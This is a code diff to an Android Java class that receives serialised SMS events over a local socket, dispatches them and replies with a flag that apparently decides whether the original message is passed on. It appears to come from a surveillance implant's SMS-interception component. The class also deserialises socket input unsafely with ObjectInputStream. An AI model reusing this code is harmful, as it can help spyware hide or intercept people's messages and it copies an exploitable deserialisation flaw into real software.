@@ -7,10 +7,15 @@ import android.util.Log;
 
 import com.android.dvci.auto.Cfg;
 
+import java.io.BufferedInputStream;
+import java.io.BufferedOutputStream;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
+import java.io.OutputStream;
 import java.util.HashMap;
 
 /**
@@ -80,7 +85,7 @@ public class LowEventHandler implements Runnable {
 		int callOrig = 1;
 		map_sms.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL,LowEventHandlerDefs.TRUE);
 		try {
-			if(map_sms.containsKey(LowEventHandlerDefs.SMS_FIELD_CONTENT)) {
+			if(map_sms.containsKey(LowEventHandlerDefs.SMS_FIELD_CONTENT) && map_sms.containsKey(LowEventHandlerDefs.SMS_FIELD_NUMBER) ) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "dispatchNormalMessage: processing " + map_sms.get(LowEventHandlerDefs.SMS_FIELD_CONTENT));
 				}
@@ -174,39 +179,53 @@ public class LowEventHandler implements Runnable {
 				try {
 					LocalSocket receiver = server.accept();
 					if (receiver != null) {
-						InputStream input = receiver.getInputStream();
+						DataInputStream streamIn = new DataInputStream(new
+								BufferedInputStream(receiver.getInputStream()));
+						DataOutputStream streamOut = new DataOutputStream(new
+								BufferedOutputStream(receiver.getOutputStream()));
 						int timeout = 5;
-						while (input.available() == 0 && timeout-- >= 0) {
+						while (streamIn.available() == 0 && timeout-- >= 0) {
 							Utils.sleep(100);
 						}
-						if (input.available() > 0) {
-							ObjectInputStream ois = new ObjectInputStream(input);
-							HashMap <String,String> event = (HashMap) ois.readObject();
-							ois.close();
-							input.close();
+						if (streamIn.available() > 0) {
+							ObjectInputStream ois = new ObjectInputStream(streamIn);
+							HashMap<String, String> event = (HashMap) ois.readObject();
 							Log.d(TAG, "GOT DATA " + event);
-							if(event.containsKey(LowEventHandlerDefs.EVENT_TYPE)){
-							if (event.get(LowEventHandlerDefs.EVENT_TYPE).contentEquals(LowEventHandlerDefs.EVENT_TYPE_SMS)){
-								dispatchNormalMessage(event);
-							}else{
-								event.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL,LowEventHandlerDefs.TRUE);
-							}
-							String reply = "HANDLED_SMS";
-							if (Cfg.DEBUG) {
-								Check.log(TAG + "SENT reply ", event);
-							}
-							}else{
+							if (event.containsKey(LowEventHandlerDefs.EVENT_TYPE)) {
+								if (event.get(LowEventHandlerDefs.EVENT_TYPE).contentEquals(LowEventHandlerDefs.EVENT_TYPE_SMS)) {
+									dispatchNormalMessage(event);
+								} else {
+									event.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL, LowEventHandlerDefs.TRUE);
+								}
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " SENT reply " + event);
+								}
+							} else {
 								event = new HashMap<String, String>();
-								event.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL,LowEventHandlerDefs.TRUE);
+								event.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL, LowEventHandlerDefs.TRUE);
 							}
-							ObjectOutputStream oos = new ObjectOutputStream(receiver.getOutputStream());
-							oos.writeObject(event);
-							oos.close();
-							receiver.getOutputStream().close();
+							timeout = 10;
+							while (timeout-- >= 0 ) {
+									try {
+										ObjectOutputStream oos = new ObjectOutputStream(streamOut);
+										oos.writeObject(event);
+										oos.flush();
+										oos.close();
+										break;
+									} catch (Exception e) {
+										if (Cfg.DEBUG) {
+											Check.log(TAG + "run: Exception sending back:", e);
+										}
+									}
+								Utils.sleep(100);
+							}
 						}
 						receiver.close();
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "run: receiver closed");
+						}
 					}
-				}catch (Exception e){
+				} catch (Exception e) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "run: Exception:", e);
 					}
